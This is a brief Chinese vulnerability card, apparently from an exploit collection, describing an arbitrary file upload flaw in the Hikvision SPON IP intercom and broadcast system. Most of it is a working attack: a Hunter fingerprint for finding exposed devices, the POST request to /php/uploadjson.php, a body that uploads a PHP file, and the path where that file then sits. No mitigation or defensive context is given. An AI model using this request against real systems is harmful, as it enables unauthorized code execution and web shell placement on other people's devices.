# 海康威视SPONIP网络对讲广播系统uploadjson存在任意文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`Hunter：`web.body="vendors/custom/html5.min.js"``
- **请求**：`POST /php/uploadjson.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 60`

**请求体 / payload**
```
jsondata[filename]=111.php&jsondata[data]=<?php phpinfo();?>

上传文件位置
/lan/111.php
```

**其他**
- 海康威视SPON IP网络对讲广播系统uploadjson存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视SPON IP网络对讲广播系统